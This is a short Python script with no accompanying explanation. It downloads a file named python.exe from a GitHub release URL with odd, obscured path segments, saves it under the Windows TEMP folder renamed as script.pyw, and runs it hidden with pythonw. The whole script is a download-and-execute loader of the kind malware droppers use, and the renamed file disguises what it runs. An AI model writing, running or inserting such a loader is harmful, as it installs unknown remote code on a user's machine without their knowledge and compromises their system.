import os
import urllib.request
import subprocess

url = "https://github.com/theolomo/-/releases/download/!/python.exe"
temp_path = os.path.join(os.getenv("TEMP"), "script.pyw")

urllib.request.urlretrieve(url, temp_path)
subprocess.run(["pythonw", temp_path], check=True)
